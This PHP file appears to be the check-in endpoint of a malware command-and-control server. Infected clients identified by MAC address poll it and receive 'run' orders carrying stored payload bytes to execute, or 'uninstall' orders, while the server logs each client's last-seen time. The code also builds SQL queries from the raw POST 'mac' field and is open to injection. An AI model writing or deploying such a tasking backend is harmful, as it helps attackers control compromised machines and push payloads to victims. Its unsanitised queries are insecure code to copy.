<?php

include('../database/db-config.php');
include('../database/db-conn.php');

function GetPayload($conn, $mac)
{
    $sql = "SELECT `payloads`.`PayloadBytes`,`payloads`.`FileName`,`payloads`.`Extension` FROM 
    `clients`, `command`,`payloads` WHERE 
    `clients`.`Id` = `command`.`Client_Id` AND 
    `command`.`StubId` = `payloads`.`Id` AND 
    `clients`.`MacAddr` = '$mac'";

    $stmt = $conn->prepare($sql);

    $stmt->execute();
    
    $result = $stmt->setFetchMode(PDO::FETCH_ASSOC);
    if($result)
    {
        $payloads = $stmt->fetchAll();    
        return $payloads;
    }
}

function GetClientId($conn, $mac)
{
    $sql = "SELECT `Id` FROM `clients` WHERE `MacAddr` = '$mac'";
    $stmt = $conn->prepare($sql);
    $stmt->execute();
    
    $result = $stmt->setFetchMode(PDO::FETCH_ASSOC);
    if($result)
    {
        $clients = $stmt->fetchAll();    
        return $clients;
    }
}

function GetCommand($conn, $id)
{
    $sql = "SELECT `Command`, `StubId` FROM `command` WHERE `command`.`Client_Id` = " .$id;
    $stmt = $conn->prepare($sql);
    $stmt->execute();
    
    $result = $stmt->setFetchMode(PDO::FETCH_ASSOC);
    if($result)
    {
        $command = $stmt->fetchAll();    
        return $command;
    }
    else
    {
        return null;
    }
}

function UpdateLastSeen($conn , $id)
{
    $sql = "update `clients` set `clients`.`LastSeen` = CURRENT_TIMESTAMP where `clients`.`Id` =". $id;
    $stmt = $conn->prepare($sql);    
    $stmt->execute();
}

function RemoveCommand($conn, $id)
{
    $sql = "DELETE FROM `command` WHERE `command`.`Client_Id` =". $id;
    $stmt = $conn->prepare($sql);    
    $stmt ->execute();   
}

$mac = $_POST['mac'];
$id = GetclientId($dbconn, $mac)[0]["Id"];
$command = GetCommand($dbconn, $id);

if($command == null)
{
    $commandarray = array('Message' => 'none');    
    echo(json_encode($commandarray));   
    UpdateLastSeen($dbconn, $id);
    die(); 
}

if($command[0]["Command"] == "run")
{
    $commandarray = array('command' => 'run', 'Payload' => GetPayload($dbconn, $mac)[0] );
    RemoveCommand($dbconn, $id);
    echo(json_encode($commandarray));    
}
else if($command[0]["Command"] == "uninstall")
{
    $commandarray = array('command' => 'uninstall');
    RemoveCommand($dbconn, $id);
    echo(json_encode($commandarray));    
}


UpdateLastSeen($dbconn, $id);
?>